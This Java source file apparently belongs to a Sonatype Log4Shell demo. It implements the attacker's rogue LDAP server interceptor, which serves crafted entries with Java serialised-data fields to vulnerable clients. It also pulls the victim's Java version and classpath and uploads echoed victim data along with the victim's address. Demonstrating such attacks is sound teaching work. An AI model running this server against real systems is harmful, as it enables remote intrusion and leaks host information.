package com.sonatype.demo.log4shell.ldapserver;


import com.sonatype.demo.log4shelldemo.helpers.LdapServerUploader;
import com.unboundid.ldap.listener.interceptor.*;
import com.unboundid.ldap.sdk.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.HashMap;
import java.util.List;
import java.util.Map;


public class Interceptor extends InMemoryOperationInterceptor {

    private static Logger log= LoggerFactory.getLogger(Interceptor.class);

    public static Map<String, CacheEntry> cache=new HashMap<>();
    private String frontend;



    /**
     * Simple sidestepping of java schema validation
     * Added objects are cached for easy access later
     */
    @Override
    public void processAddRequest(InMemoryInterceptedAddRequest request) throws LDAPException {

        log.info(">>>processAddRequest");
        ReadOnlyAddRequest roa=request.getRequest();
        log.info("added {}",roa.getDN());

       CacheEntry ce=new CacheEntry();
        ce.dn=roa.getDN();
        ce.attributes=roa.getAttributes();

        cache.put(ce.dn,ce);



    }


    /**
     * Add always succeeds
     * @param result
     */
    @Override
    public void processAddResult(InMemoryInterceptedAddResult result) {

        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    /**
     * Search request handler.
     * Stores the search request data
     *
     * @param result
     */
    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult result) {

        String addr=result.getConnectedAddress();

        String key=result.getRequest().getBaseDN();
        log.info("search result for key {}",key);

        CacheEntry ce=handleRequest(key,addr);

        Entry e=new Entry(ce.dn);
        for(Attribute a:ce.attributes) {
            e.addAttribute(a);
        }

        try {
            result.sendSearchEntry(e);
        } catch (LDAPException ex) {
            ex.printStackTrace();
            log.info("no object found");
            result.setResult(new LDAPResult(0, ResultCode.NO_SUCH_OBJECT));
        }
        log.info("returning object");
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));

    }


    public  CacheEntry handleRequest(String key,String addr) {




        if(cache.containsKey(key)) {
            return cache.get(key);
        }

        if(key.equals("a")) {
            // starting conversation ..
            // request java version
           log.info("ask for version");
            return cache.get("cn=getversion");

        }

        if(key.startsWith("echo/")) {
            String data=key.substring(5);
            LdapServerUploader.upload("cn=echo",addr+" sent us "+data);
            return cache.get("cn=echo");



        }
        if(key.startsWith("version/")) {
            System.out.println(key);
            System.out.println("ask for classpath");
            return cache.get("cn=getclasspath");

        }

        if(key.startsWith("classpath/")) {
            System.out.println(key);
            return cache.get("cn=saythankyou");

        }

        return cache.get("cn=404");

    }




    public static class CacheEntry {

        public List<Attribute> attributes;
        public String dn;
        public String[] objectClass;
        public String[] javaClassNames;
        public String javaClassName;
        public String cn;
        public byte[] javaSerialisedData;
    }

}
